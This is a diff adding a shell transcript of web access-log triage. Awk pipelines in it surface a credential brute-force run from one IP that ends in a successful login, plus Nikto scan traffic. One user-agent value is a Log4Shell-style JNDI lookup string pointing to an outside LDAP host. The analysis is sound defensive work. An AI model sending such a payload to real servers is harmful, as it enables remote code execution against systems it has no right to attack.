@@ -1,0 +1,36 @@
+$ wc -l < web/access.log
+4105
+$ awk '{print $1}' web/access.log | sort | uniq -c | sort -nr | head -n 10
+    422 203.0.113.66
+     76 192.0.2.12
+     74 198.51.100.113
+     74 192.0.2.31
+     72 192.0.2.29
+     72 192.0.2.23
+     71 192.0.2.40
+     71 192.0.2.18
+     69 198.51.100.105
+     68 198.51.100.114
+$ awk '$9 >= 400 {print $9, $7}' web/access.log | sort | uniq -c | sort -nr | head -n 5
+    420 401 /api/v1/auth/login
+     36 502 /api/v1/feed
+     29 504 /api/v1/feed
+     25 502 /api/v1/notifications
+     19 502 /api/v1/me
+$ awk '{print substr($4, 2, 17)}' web/access.log | sort | uniq -c | sort -nr | head -n 1
+     36 20/Nov/2026:14:07
+$ awk '$9 >= 500 {e++} END {printf "%.2f%%\n", 100*e/NR}' web/access.log
+3.34%
+$ awk -F'"' '{print $6}' web/access.log | sort | uniq -c | sort -n | head -n 3 | cut -c1-80
+      1 ${jndi:ldap://198.51.100.99:1389/a}
+     30 Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)
+    422 python-requests/2.32.3
+$ awk '$9 == 401 {print $1}' web/access.log | sort | uniq -c | sort -nr | head -n 1
+    420 203.0.113.66
+$ grep '^203.0.113.66 ' web/access.log | awk '$9 == 200 {print $4, $6, $7, $9}'
+[20/Nov/2026:02:41:07 "POST /api/v1/auth/login 200
+[20/Nov/2026:02:41:09 "GET /api/v1/me 200
+$ awk '{print substr($4, 14, 2)}' web/access.log | sort | uniq -c | sort -nr | head -n 1
+    442 02
+$ awk '{b += $10} END {printf "%.1f MB\n", b/1024/1024}' web/access.log
+77.9 MB
